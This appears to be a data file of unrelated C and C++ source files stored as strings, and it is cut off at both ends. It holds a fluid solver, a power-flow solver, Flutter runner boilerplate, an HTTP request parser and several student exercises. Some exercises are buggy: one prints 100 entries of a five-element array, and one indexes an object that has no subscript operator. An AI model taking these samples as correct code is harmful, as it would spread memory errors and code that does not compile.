feq;\n}\n\nvoid init(SimParam const& param)\n{\n    T rho0 = 1.0;\n    T U0 = param.GetLatticeU();\n    T nx = param.GetNx();\n    T ny = param.GetNy();\n    T nz = param.GetNz();\n    rhoF = LBM::DensityField(nx,ny,nz);\n    velF = LBM::VelocityField(nx,ny,nz);\n    velF0 = LBM::VelocityField(nx,ny,nz);\n    latticeF = LBM::LatticeField(nx,ny,nz);\n    latticeF0 = LBM::LatticeField(nx,ny,nz);\n\n    for (int z=0; z<nz; ++z) {\n        for (int y=0; y<ny; ++y) {\n            for (int x=0; x<nx; ++x) {\n                rhoF(x,y,z) = rho0;\n                velF(x,y,z)[0] = 0.0;\n                velF(x,y,z)[1] = 0.0;\n                velF(x,y,z)[2] = 0.0;\n                velF(x,y,0)[2] = U0; // z == 0 \u5904\u4e3a\u901f\u5ea6\u5165\u53e3 vel-z == U0\n                T uSqr = pow(velF(x,y,z)[0],2) + pow(velF(x,y,z)[1],2) + pow(velF(x,y,z)[2],2);\n                for (int i=0; i<LBM::q; ++i) {\n                    latticeF(x,y,z)[i] = feq_i(i, rhoF(x,y,z), velF(x,y,z), uSqr);\n                }\n            }\n        }\n    }\n}\n\nvoid evolution(SimParam const& param)\n{\n    int const nx = param.GetNx();\n    int const ny = param.GetNy();\n    int const nz = param.GetNz();\n    T const omega = param.GetOmega();\n    // Bulk\n    // ---- collision and streaming (separate) ----\n#ifdef MY_OMP_OPEN\n    #pragma omp parallel for\n#endif\n    for (int z=0; z<nz; ++z) {\n        for (int y=0; y<ny; ++y) {\n            for (int x=0; x<nx; ++x) {\n                T uSqr = pow(velF(x,y,z)[0],2) + pow(velF(x,y,z)[1],2) + pow(velF(x,y,z)[2],2);\n                for (int i=0; i<LBM::q; ++i) {\n                    latticeF(x,y,z)[i] *= (1.0-omega);\n                    latticeF(x,y,z)[i] += omega*feq_i(i, rhoF(x,y,z), velF(x,y,z), uSqr);\n                }\n            }\n        }\n    }\n    // ---- streaming just bulk (boundary not streaming) ----\n#ifdef MY_OMP_OPEN\n    #pragma omp parallel for\n#endif\n    for (int z=1; z<nz-1; ++z) {\n        for (int y=1; y<ny-1; ++y) {\n            for (int x=1; x<nx-1; ++x) {\n                for (int i=0; i<LBM::q; ++i) {\n                    int ix = x - LBM::c[i][0];\n                    int iy = y - LBM::c[i][1];\n                    int iz = z - LBM::c[i][2];\n                    latt",
    "#include \"SolverFLPF.h\"\n#include \"../../model/gridElements/CurrentController.h\"\n#include \"../../math/VectorTools.h\"\n#include \"../../math/Matrix.h\"\n#include \"../../math/LSSolver.h\"\n#include \"../../Config.h\"\n\n\n/** Constructor.\n* @param model the DataModel of the grid.**/\nSolverFLPF::SolverFLPF(DataModel* model) :Solver(model)\n{\n}\n/** Constructor.\n* @param model the DataModel of the grid.\n* @param logger the SolverLogging object for logging.**/\nSolverFLPF::SolverFLPF(DataModel* model, SolverLogging* logger) : Solver(model, logger)\n{\n}\n/** Overriden method from Solver::calculateVoltages() **/\nstd::vector<double> SolverFLPF::calculateVoltages(std::vector<double> currents, std::vector<double> powers, std::vector<double> operatingPoint)\n{\n\tfor (Node* v : model->getNodes())\n\t{\n\t\tif (v->getType() == Node::Types::CURRENT_CONTROLLER)\n\t\t{\n\t\t\tif (currents[model->getNodeIndex(v)] != 0)\n\t\t\t{\n\t\t\t\tstd::cout << *v << std::endl;\n\t\t\t\tstd::cerr << \"Current setpoints are not allowed for FLPF solver.\" << std::endl;\n\t\t\t\texit(1);\n\t\t\t}\n\t\t}\n\t}\n\n\n\n\tint loggingIndex;\n\tif (logger != nullptr)\n\t{\n\t\tloggingIndex = logger->newLog();\n\t}\n\n\tfor (int i = 0; i < powers.size(); i++)\n\t{\n\t\tpowers[i] = powers[i] / (VOLTAGE * VOLTAGE);\n\t}\n\n\tif (!lss->isInitialized())\n\t{\n\t\tlss->setMatrix(model->getAdmittanceMatrix());\n\t}\n\tstd::vector<double> deltaVoltages = lss->getSolution(powers);\n\t//VectorTools::print(\"deltaVoltages: \", deltaVoltages);\n\n\t//std::vector<double> errors = VectorTools::subtract(powers, Matrix::multiply(model->getAdmittanceMatrix(), deltaVoltages));\n\tMatrix* diag = new Matrix(deltaVoltages.size(), deltaVoltages.size());\n\tfor (int i = 0; i < deltaVoltages.size(); i++)\n\t{\n\t\tdiag->setValue(i, i, deltaVoltages[i]);\n\t}\n\tstd::vector<double> errors = VectorTools::subtract(powers, Matrix::multiply(diag, Matrix::multiply(model->getAdmittanceMatrix(), deltaVoltages)));\n\tdelete diag;\n\n\t//VectorTools::print(\"errors: \", errors);\n\tstd::vector<double> correctedDeltaVoltages = lss->getSolution(errors);\n\n\t//VectorTools::print(\"correctedDeltaVoltages: \", correctedDeltaVoltages);\n\tstd::vector<double> voltages = VectorTools::add(correctedDeltaVoltages, std::vector<double>(correctedDeltaVoltages.size(), 1));\n\tfor (int i = 0; i < voltages.size(); i++)\n\t{\n\t\tvoltages[i] = voltages[i] * VOLTAGE;//TODO voltage could be a param, derived by nodes\n\t}\n\n\tif (logger != nullptr)\n\t{\n\t\tstd::vector<double> dx(voltages.size(), 0);\n\t\tVectorTools::subtract(&voltages, &operatingPoint, &dx);//dx = xnew-x\t\n\t\tlogger->logNormDx(VectorTools::norm(dx), loggingIndex);\n\t}\n\t//\tVectorTools::print(\"voltages: \", voltages);\n\treturn voltages;\n}\n\n/** Overriden method from Solver::getType() **/\nstd::string SolverFLPF::getType()\n{\n\treturn \"FLPF\";\n}\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"todolist\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include <iostream>\n#include <ctime>\n\nusing namespace std;\n\nclass Item\n{\npublic:\n    virtual ~Item() {}  // \u0414\u043e\u0431\u0430\u0432\u043b\u0435\u043d \u0432\u0438\u0440\u0442\u0443\u0430\u043b\u044c\u043d\u044b\u0439 \u0434\u0435\u0441\u0442\u0440\u0443\u043a\u0442\u043e\u0440 \u0434\u043b\u044f \u043a\u043e\u0440\u0440\u0435\u043a\u0442\u043d\u043e\u0433\u043e \u0443\u0434\u0430\u043b\u0435\u043d\u0438\u044f \u043e\u0431\u044a\u0435\u043a\u0442\u043e\u0432\n    virtual void display() = 0;\n};\n\nclass Fish: public Item\n{\npublic:\n    Fish()\n    {\n        cout << \"Fish constructor called.\" << std::endl;\n    }\n\n    ~Fish()\n    {\n        cout << \"Fish destructor called.\" << std::endl;\n    }\n\n    void display() override {\n        cout << \"Fish\" << std::endl;\n    }\n\n};\n\nclass Boot: public Item\n{\npublic:\n    Boot()\n    {\n        cout << \"Boot constructor called.\" << std::endl;\n    }\n\n    ~Boot()\n    {\n        cout << \"Boot destructor called.\" << std::endl;\n    }\n\n    void display() override {\n        cout << \"Boot\" << std::endl;\n    }\n};\n\n\ntemplate<typename T>\nclass Field\n{\nprivate:\n    static const int SIZE = 9;\n    T *field[SIZE]; // \u041c\u0430\u0441\u0441\u0438\u0432 \u0443\u043a\u0430\u0437\u0430\u0442\u0435\u043b\u0435\u0439 \u043d\u0430 Fish, Boot\npublic:\n    Field()\n    {\n        // \u0418\u043d\u0438\u0446\u0438\u0430\u043b\u0438\u0437\u0430\u0446\u0438\u044f \u043c\u0430\u0441\u0441\u0438\u0432\u0430 \u0443\u043a\u0430\u0437\u0430\u0442\u0435\u043b\u0435\u0439 \u043d\u0443\u043b\u0435\u0432\u044b\u043c\u0438 \u0443\u043a\u0430\u0437\u0430\u0442\u0435\u043b\u044f\u043c\u0438\n        for(int i = 0; i < SIZE; ++i)\n        {\n            field[i] = nullptr;\n        }\n    }\n\n    // \u0414\u0435\u0441\u0442\u0440\u0443\u043a\u0442\u043e\u0440 \u0434\u043b\u044f \u043e\u0441\u0432\u043e\u0431\u043e\u0436\u0434\u0435\u043d\u0438\u044f \u043f\u0430\u043c\u044f\u0442\u0438 \u0438\u0437 \u043a\u0443\u0447\u0438\n    ~Field()\n    {\n        for(int i = 0; i < SIZE; ++i)\n        {\n            delete field[i]; // \u0423\u0434\u0430\u043b\u0435\u043d\u0438\u0435 \u043e\u0431\u044a\u0435\u043a\u0442\u043e\u0432 Fish \u0438\u0437 \u043a\u0443\u0447\u0438\n        }\n    }\n\n    void addFish()\n    {\n        // \u0413\u0435\u043d\u0435\u0440\u0430\u0446\u0438\u044f \u0441\u043b\u0443\u0447\u0430\u0439\u043d\u043e\u0433\u043e \u0438\u043d\u0434\u0435\u043a\u0441\u0430\n        int randomIndex = std::rand() % SIZE;\n        // \u0421\u043e\u0437\u0434\u0430\u043d\u0438\u0435 \u043d\u043e\u0432\u043e\u0433\u043e \u043e\u0431\u044a\u0435\u043a\u0442\u0430 Fish \u0432 \u043a\u0443\u0447\u0435 \u0438 \u043f\u0440\u0438\u0441\u0432\u043e\u0435\u043d\u0438\u0435 \u0435\u0433\u043e \u0443\u043a\u0430\u0437\u0430\u0442\u0435\u043b\u044f \u044d\u043b\u0435\u043c\u0435\u043d\u0442\u0443 \u043c\u0430\u0441\u0441\u0438\u0432\u0430 field\n        field[randomIndex] = new Fish();\n    }\n\n    void addBoot()\n    {\n        // \u0413\u0435\u043d\u0435\u0440\u0430\u0446\u0438\u044f \u0441\u043b\u0443\u0447\u0430\u0439\u043d\u043e\u0433\u043e \u0438\u043d\u0434\u0435\u043a\u0441\u0430\n        int randomIndex = std::rand() % SIZE;\n        // \u0421\u043e\u0437\u0434\u0430\u043d\u0438\u0435 \u043d\u043e\u0432\u043e\u0433\u043e \u043e\u0431\u044a\u0435\u043a\u0442\u0430 Fish \u0432 \u043a\u0443\u0447\u0435 \u0438 \u043f\u0440\u0438\u0441\u0432\u043e\u0435\u043d\u0438\u0435 \u0435\u0433\u043e \u0443\u043a\u0430\u0437\u0430\u0442\u0435\u043b\u044f \u044d\u043b\u0435\u043c\u0435\u043d\u0442\u0443 \u043c\u0430\u0441\u0441\u0438\u0432\u0430 field\n        field[randomIndex] = new Boot();\n    }\n};\n\nvoid cast()\n{\n\n}\n\nint main()\n{\n    // \u0418\u043d\u0438\u0446\u0438\u0430\u043b\u0438\u0437\u0430\u0446\u0438\u044f \u0433\u0435\u043d\u0435\u0440\u0430\u0442\u043e\u0440\u0430 \u0441\u043b\u0443\u0447\u0430\u0439\u043d\u044b\u0445 \u0447\u0438\u0441\u0435\u043b\n    std::srand(static_cast<unsigned int>(std::time(nullptr)));\n\n    Field<Item> field;\n    field.addFish(); // \u0414\u043e\u0431\u0430\u0432\u043b\u0435\u043d\u0438\u0435 \u0440\u044b\u0431\u044b \u043d\u0430 \u0441\u043b\u0443\u0447\u0430\u0439\u043d\u0443\u044e \u043f\u043e\u0437\u0438\u0446\u0438\u044e \u0432 \u043f\u043e\u043b\u0435\n    field.addBoot(); // \u0414\u043e\u0431\u0430\u0432\u043b\u0435\u043d\u0438\u0435 \u0441\u0430\u043f\u043e\u0433\u0430 \u043d\u0430 \u0441\u043b\u0443\u0447\u0430\u0439\u043d\u0443\u044e \u043f\u043e\u0437\u0438\u0446\u0438\u044e \u0432 \u043f\u043e\u043b\u0435\n\n    // \u0412\u044b\u0432\u043e\u0434 \u0442\u0438\u043f\u043e\u0432 \u043e\u0431\u044a\u0435\u043a\u0442\u043e\u0432 \u0438\u0437 \u043a\u043e\u043b\u043b\u0435\u043a\u0446\u0438\u0438\n    //int size = sizeof(field) / sizeof(field[0]);\n    for (int i = 0; i < 9; ++i)\n    {\n        field[i]->display();\n    }\n    return 0;\n}",
    "/* ************************************************************************** */\n/*                                                                            */\n/*                                                        :::      ::::::::   */\n/*   ParseData.cpp                                      :+:      :+:    :+:   */\n/*                                                    +:+ +:+         +:+     */\n/*   By: bjimenez <bjimenez@student.42malaga.com    +#+  +:+       +#+        */\n/*                                                +#+#+#+#+#+   +#+           */\n/*   Created: 2023/10/11 13:06:10 by bjimenez          #+#    #+#             */\n/*   Updated: 2023/12/05 14:01:12 by bjimenez         ###   ########.fr       */\n/*                                                                            */\n/* ************************************************************************** */\n\n#include \"ParseData.hpp\"\n\nParseData::ParseData(void)\n{\n\tthis->request.clear();\n\tthis->root.clear();\n\tthis->data_resp.clear();\n\tthis->v_post.clear();\n\tthis->endPost = false;\n}\n\nParseData::ParseData(std::string input)\n{\n\tthis->request = input;\n\tthis->endPost = false;\n\tParseData::get_data_resp();\n}\n\nParseData::ParseData(ParseData &copy)\n{\n\tthis->request = copy.request;\n\tthis->endPost = copy.endPost;\n\tthis->root = copy.root;\n\tthis->data_resp = copy.data_resp;\n\tthis->v_post = copy.v_post;\n\tthis->endPost = copy.endPost;\n}\n\nParseData& ParseData::operator=(ParseData &obj)\n{\n\tthis->request = obj.request;\n\tthis->endPost = obj.endPost;\n\tthis->root = obj.root;\n\tthis->data_resp = obj.data_resp;\n\tthis->v_post = obj.v_post;\n\tthis->endPost = obj.endPost;\n\treturn (*this);\n}\n\nParseData::~ParseData(void)\n{\n}\n\nbool\tParseData::get_data_value(int opt, std::string aux)\n{\n\tswitch (opt)\n\t{\n\t\tcase 1:\n\t\t\tif (aux.substr(0, aux.find(':')) == \"Host\")\n\t\t\t{\n\t\t\t\tthis->data_resp[\"Host\"] = aux.substr(aux.find(':') + 2);\n\t\t\t\treturn (true);\n\t\t\t}\n\t\tcase 2:\n\t\t\tif (aux.substr(0, aux.find(':')) == \"Connection\")\n\t\t\t{\n\t\t\t\tthis->data_resp[\"Connection\"] = aux.substr(aux.find(':') + 2);\n\t\t\t\treturn (true);\n\t\t\t}\n\t\tcase 3:\n\t\t\tif (aux.substr(0, aux.find(':')) == \"User-Agent\")\n\t\t\t{\n\t\t\t\tthis->data_resp[\"User-Agent\"] = aux.substr(aux.find(':') + 2);\n\t\t\t\treturn (true);\n\t\t\t}\n\t\tcase 4:\n\t\t\tif (aux.substr(0, aux.find(':')) == \"Accept\")\n\t\t\t{\n\t\t\t\tthis->data_resp[\"Accept\"] = aux.substr(aux.find(':') + 2);\n\t\t\t\treturn (true);\n\t\t\t}\n\t\tcase 5:\n\t\t\tif (aux.substr(0, aux.find(':')) == \"Referer\")\n\t\t\t{\n\t\t\t\tthis->data_resp[\"Referer\"] = aux.substr(aux.find(':') + 2);\n\t\t\t\treturn (true);\n\t\t\t}\n\t\tcase 6:\n\t\t\tif (aux.substr(0, aux.find(':')) == \"Accept-Encoding\")\n\t\t\t{\n\t\t\t\tthis->data_resp[\"Accept-Encoding\"] = aux.substr(aux.find(':') + 2);\n\t\t\t\treturn (true);\n\t\t\t}\n\t\tcase 7:\n\t\t\tif (aux.substr(0, aux.find(':')) == \"Content-Length\")\n\t\t\t{\n\t\t\t\tthis->data_resp[\"Content-Length\"] = aux.substr(aux.find(':') + 2);\n\t\t\t\treturn (true);\n\t\t\t}\n\t\tcase 8:\n\t\t\tif (aux.substr(0, aux.find(':')) == \"Upgrade-Insecure-Requests\")\n\t\t\t{\n\t\t\t\tthis->data_resp[\"Upgrade-Insecure-Requests\"] = aux.substr(aux.find(':') + 2);\n\t\t\t\treturn (true);\n\t\t\t}\n\t\tcase 9:\n\t\t\tif (aux.substr(0, aux.find(':')) == \"Origin\")\n\t\t\t{\n\t\t\t\tthis->data_resp[\"Origin\"] = aux.substr(aux.find(':') + 2);\n\t\t\t\treturn (true);\n\t\t\t}\n\t\tcase 10:\n\t\t\tif (aux.substr(0, aux.find(':')) == \"Content-Type\")\n\t\t\t{\n\t\t\t\tthis->data_resp[\"Content-Type\"] = aux.substr(aux.find(':') + 2);\n\t\t\t\tif (this->data_resp[\"Content-Type\"].find(\"multipart\") != std::string::npos)\n\t\t\t\t{\n\t\t\t\t\tthis->data_resp[\"boundary\"] = aux.substr(aux.find('=') + 1);\n\t\t\t\t\tthis->data_resp[\"end_bound\"] = this->data_resp[\"boundary\"].substr(0, this->data_resp[\"boundary\"].length()) + \"--\";\n\t\t\t\t}\n\t\t\t\treturn (true);\n\t\t\t}\n\t\tdefault:\n\t\t\treturn (false);\n\t}\n\treturn (false);\n}\n\nvoid\tParseData::check_endPost(void)\n{\n\tif (v_post.length() == (unsigned long)atol(this->data_resp[\"Content-Length\"].c_str()))\n\t\tthis->endPost = true;\n}\n\nvoid\tParseData::get_data_resp(void)\n{\n\tstd::string\taux;\n\tstd::string line(this->request);\n\tint \t\ti = 1;\n\n\taux = this->request.substr(0, this->request.find('\\n') - 1);\n\tthis->data_resp[\"type\"] = aux.substr(0, aux.find(' '));\n\tthis->data_resp[\"url\"] = aux.substr(aux.find(' ') + 1, aux.rfind(' ') - aux.find(' ') - 1);\n\tif (this->data_resp[\"url\"].rfind('/') == this->data_resp[\"url\"].length() - 1)\n\t\tthis->data_resp[\"url\"] = this->data_resp[\"url\"].erase(this->data_resp[\"url\"].rfind('/'), 1);\n\tthis->data_resp[\"protoc\"] = aux.substr(aux.rfind(\" \") + 1);\n\t\n\tstd::istringstream input(this->request);\n\t\n\tfor (; std::getline(input, aux, '\\n'); )\n\t{\n\t\tif (aux.find('\\r') != std::string::npos)\n\t\t\taux = aux.erase(aux.find('\\r'), 1);\n \t\tif (ParseData::get_data_value(i, aux))\n\t\t\ti++;\n\t}\n\tthis->v_post.clear();\n\tsize_t pos  = line.find(\"\\r\\n\\r\\n\");\n\tif (pos != std::string::npos)\n\t\tthis->v_post = line.substr(pos + 4);\n\tParseData::check_endPost();\n}\n\n/**********GETS*************/\n\nstd::string\t\tParseData::get_data(std::string data)\n{\n\treturn(this->data_resp[data]);\n}\n\nbool\t\t\tParseData::get_endPost(void)\n{\n\treturn(this->endPost);\n}",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"medical_app\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include<stdio.h> \r\n\r\nvoid Traverse();\r\nvoid Insertion_at_begin();\r\nvoid Insertion_at_end();\r\nvoid Insertion_at_loc();\r\nvoid Deletion_at_begin();\r\nvoid Deletion_at_end();\r\nvoid Deletion_at_loc();\r\n\r\nint lb = 0;\r\nint ub = 5;\r\nint choice;\r\nint arr[5];\r\n\r\n\r\nvoid array()\r\n {\r\n    printf(\"The array elements are: \\n\");\r\n    for (int i = 0; i < 100; i++) \r\n\t{\r\n      printf(\"%d\\n\", arr[i]);\r\n    }\r\n}\r\n\r\nint main() \r\n{\r\n    do \r\n\t{\r\n    \tarray();\r\n        printf(\"Menu:\\n\");\r\n        printf(\"1:Traversing in array\\n\");\r\n        printf(\"2:Insertion at the beginning\\n\");\r\n        printf(\"3:Insertion at the end\\n\");\r\n        printf(\"4:Insertion at a particular location\\n\");\r\n        printf(\"5:Deletion at the beginning\\n\");\r\n        printf(\"6:Deletion at the end\\n\");\r\n        printf(\"7:Deletion at a particular location\\n\");\r\n        printf(\"8:EXIT\\n\");\r\n\r\n        printf(\"Enter your choice (1-8): \");\r\n        scanf(\"%d\", &choice);\r\n\r\n        switch (choice) \r\n\t\t{\r\n            case 1:\r\n                Traverse();\r\n                break;\r\n            case 2:\r\n                Insertion_at_begin();\r\n                break;\r\n            case 3:\r\n                Insertion_at_end();\r\n                break;\r\n            case 4:\r\n                Insertion_at_loc();\r\n                break;\r\n            case 5:\r\n                Deletion_at_begin();\r\n                break;\r\n            case 6:\r\n                Deletion_at_end();\r\n                break;\r\n            case 7:\r\n                Deletion_at_loc();\r\n                break;\r\n            case 8:\r\n                printf(\"Exiting the program. Goodbye!\\n\");\r\n                break;\r\n            default:\r\n                printf(\"Invalid choice. Please enter a number between 1 and 8.\\n\");\r\n        }\r\n    } while (choice != 8);\r\n\r\n    return 0;\r\n}\r\n\r\nvoid Traverse()\r\n {\r\n    int temp;\r\n    if (ub < lb)\r\n\t{\r\n        printf(\"Array is empty\\n\");\r\n    }\r\n\t else \r\n\t{\r\n        temp = lb;\r\n        while (temp <= ub) \r\n\t\t{\r\n            printf(\"%d\\n\", arr[temp]);\r\n            temp = temp + 1;\r\n        }\r\n    }\r\n    printf(\"\\n\");\r\n}\r\n\r\nvoid Insertion_at_begin() \r\n{\r\n    int value;\r\n    int temp;\r\n    if (ub == 5 - 1)\r\n\t{\r\n        printf(\"Array is full\\n\");\r\n    } \r\n\telse if (ub < 0) \r\n\t{\r\n        ub = 0;\r\n        \r\n        printf(\"Enter the value to be inserted: \");\r\n        scanf(\"%d\", &value);\r\n        arr[ub] = value;\r\n    } \r\n\telse \r\n\t{\r\n        temp = ub;\r\n        while (temp >= lb) \r\n\t\t{\r\n            arr[temp + 1] = arr[temp];\r\n            temp = temp - 1;\r\n        }\r\n        printf(\"Enter the value to be inserted: \");\r\n        scanf(\"%d\", &value);\r\n        arr[lb] = value;\r\n    }\r\n    ub++;\r\n    printf(\"The Array elements are: \\n\");\r\n    for (int i = lb; i <= ub; i++) \r\n\t{\r\n        printf(\"%d\\n\", arr[i]);\r\n    }\r\n    printf(\"\\n\");\r\n}\r\n\r\nvoid Insertion_at_end()\r\n{\r\n\tint value;\r\n\tif(ub==5-1)\r\n\t{\r\n\t  printf(\"Array is full\");\t\r\n\t}\r\n    else if(ub<0)\r\n    {\r\n    \tlb=0;\r\n    \tub=0;\r\n    \tprintf(\"Enter the value to be inserted: \");\r\n        scanf(\"%d\", &value);\r\n    \tarr[ub]=value;\r\n\t}\r\n\telse\r\n\t{\r\n\t\tub++;\r\n\t\tprintf(\"Enter the value to be inserted: \");\r\n        scanf(\"%d\", &value);\r\n\t\tarr[ub]=value;\r\n\t}\r\n    printf(\"The Array elements are: \\n\");\r\n    for (int i = lb; i <= ub; i++) \r\n\t{\r\n        printf(\"%d\\n\", arr[i]);\r\n    }\r\n\tprintf(\"\\n\");\r\n}\r\n\r\nvoid Insertion_at_loc() \r\n{\r\n\tint loc;\r\n\tint value;\r\n\tint temp;\r\n\tprintf(\"enter the location where to add array:\");\r\n\tscanf(\"%d\",&loc);\r\n\tprintf(\"Enter the value to be inserted: \");\r\n    scanf(\"%d\",&value);\t\r\n\t\r\n   if(loc<0||ub==5-1||loc>ub+1)\r\n   {\r\n   \t  printf(\"Invalid location or array is full\\n\");\r\n   }\r\n\telse\r\n\t{\r\n        for (int i = ub; i >= loc; i--)   \r\n        {\r\n            arr[i + 1] = arr[i];\r\n        }\r\n        arr[loc] = value;\r\n        ub++;\r\n\r\n        printf(\"Array elements are:\\n\");\r\n        for (int i = lb; i <= ub; i++) \r\n        {\r\n            printf(\"%d\\n\", arr[i]);\r\n        }\r\n    }\r\n}\r\n\r\nvoid Deletion_at_begin() \r\n{\r\n  if(ub<lb)\r\n  {\r\n  \tprintf(\"Array is empty\\n\");\r\n  }\r\n  else\r\n  {\r\n    lb++;\r\n  }\r\n    printf(\"Array after deletion:\\n\");\r\n    for (int i = lb; i <= ub; i++) \r\n    {\r\n        printf(\"%d\\n\", arr[i]);\r\n    }\r\n}\r\n\r\nvoid Deletion_at_end()\r\n{\r\n   if(ub<lb)\r\n  {\r\n    printf(\"Array is empty\\n\");\r\n  } \r\n  else\r\n  {\r\n\tub--;\r\n\tprintf(\"Array after deletion:\\n\");\r\n   for (int i = lb; i <= ub; i++) \r\n    {\r\n       printf(\"%d\\n\", arr[i]);\r\n    }\r\n  }\r\n  printf(\"\\n\");\r\n}\r\n\r\nvoid Deletion_at_loc()\r\n{\r\n    if (ub < lb)\r\n    {\r\n        printf(\"Array is empty\\n\");\r\n    }\r\n    else\r\n    {\r\n        int loc;\r\n        printf(\"Enter the location where to delete element: \");\r\n        scanf(\"%d\", &loc);\r\n        if (loc < lb || loc > ub)\r\n        {\r\n            printf(\"Invalid location\\n\");\r\n        }\r\n        else\r\n        {\r\n            for (int i = loc; i < ub; i++)\r\n            {\r\n                arr[i] = arr[i + 1];\r\n            }\r\n            ub--;\r\n            printf(\"Array after deletion:\\n\");\r\n            for (int i = lb; i <= ub; i",
    "// Copyright 2014 The Flutter Authors. All rights reserved.\n// Use of this source code is governed by a BSD-style license that can be\n// found in the LICENSE file.\n\n#include \"flutter_window.h\"\n\n#include <optional>\n\n#include \"flutter/generated_plugin_registrant.h\"\n\nFlutterWindow::FlutterWindow(const flutter::DartProject& project)\n    : project_(project) {}\n\nFlutterWindow::~FlutterWindow() {}\n\nbool FlutterWindow::OnCreate() {\n  if (!Win32Window::OnCreate()) {\n    return false;\n  }\n\n  RECT frame = GetClientArea();\n\n  // The size here must match the window dimensions to avoid unnecessary surface\n  // creation / destruction in the startup path.\n  flutter_controller_ = std::make_unique<flutter::FlutterViewController>(\n      frame.right - frame.left, frame.bottom - frame.top, project_);\n  // Ensure that basic setup of the controller was successful.\n  if (!flutter_controller_->engine() || !flutter_controller_->view()) {\n    return false;\n  }\n  RegisterPlugins(flutter_controller_->engine());\n  SetChildContent(flutter_controller_->view()->GetNativeWindow());\n\n  flutter_controller_->engine()->SetNextFrameCallback([&]() {\n    this->Show();\n  });\n\n  // Flutter can complete the first frame before the \"show window\" callback is\n  // registered. The following call ensures a frame is pending to ensure the\n  // window is shown. It is a no-op if the first frame hasn't completed yet.\n  flutter_controller_->ForceRedraw();\n\n  return true;\n}\n\nvoid FlutterWindow::OnDestroy() {\n  if (flutter_controller_) {\n    flutter_controller_ = nullptr;\n  }\n\n  Win32Window::OnDestroy();\n}\n\nLRESULT\nFlutterWindow::MessageHandler(HWND hwnd, UINT const message,\n                              WPARAM const wparam,\n                              LPARAM const lparam) noexcept {\n  // Give Flutter, including plugins, an opportunity to handle window messages.\n  if (flutter_controller_) {\n    std::optional<LRESULT> result =\n        flutter_controller_->HandleTopLevelWindowProc(hwnd, message, wparam,\n                                                      lparam);\n    if (result) {\n      return *result;\n    }\n  }\n\n  switch (message) {\n    case WM_FONTCHANGE:\n      flutter_controller_->engine()->ReloadSystemFonts();\n      break;\n  }\n\n  return Win32Window::MessageHandler(hwnd, message, wparam, lparam);\n}\n",
    "#include <iostream>\r\n#include \"student.h\"\r\n#include \"degree.h\"\r\nusing std::cout;\r\nusing std::endl;\r\nusing std::string;\r\n\r\nstring Student::getId() {\r\n    return student_id;\r\n}\r\nvoid Student::setId(string new_id) {\r\n    student_id = new_id;\r\n}\r\n\r\nstring Student::getFirstName() {\r\n    return first_name;\r\n}\r\nvoid Student::setFirstName(string new_first_name) {\r\n    first_name = new_first_name;\r\n}\r\n\r\nstring Student::getLastName() {\r\n    return last_name;\r\n}\r\nvoid Student::setLastName(string new_last_name) {\r\n    last_name = new_last_name;\r\n}\r\n\r\nstring Student::getEmail() {\r\n    return email;\r\n}\r\nvoid Student::setEmail(string new_email) {\r\n    email = new_email;\r\n}\r\n\r\nint Student::getAge() {\r\n    return age;\r\n}\r\nvoid Student::setAge(int new_age) {\r\n    age = new_age;\r\n}\r\n\r\nstring Student::getProgram() {\r\n    switch (program) {\r\n    case DegreeProgram::SECURITY: {\r\n        return \"SECURITY\";\r\n        break;\r\n    }\r\n    case DegreeProgram::NETWORK: {\r\n        return \"NETWORK\";\r\n        break;\r\n    }\r\n    case DegreeProgram::SOFTWARE: {\r\n        return \"SOFTWARE\";\r\n        break;\r\n    }\r\n    default:\r\n        return \"Not set\";\r\n    }\r\n}\r\nvoid Student::setProgram(DegreeProgram new_program) {\r\n    if (new_program > DegreeProgram::SOFTWARE || new_program < DegreeProgram::SECURITY)\r\n        throw std::invalid_argument(\"Invalid Degree Program (0 - SECURITY, 1 - NETWORK, 2 - SOFTWARE)\");\r\n    else\r\n        program = new_program;\r\n}\r\n\r\nint Student::getCompletionDay(int class_num) {\r\n    return days_to_completion[class_num - 1];\r\n}\r\n\r\nvoid Student::setCompletionDay(int class_num, int num_days) {\r\n    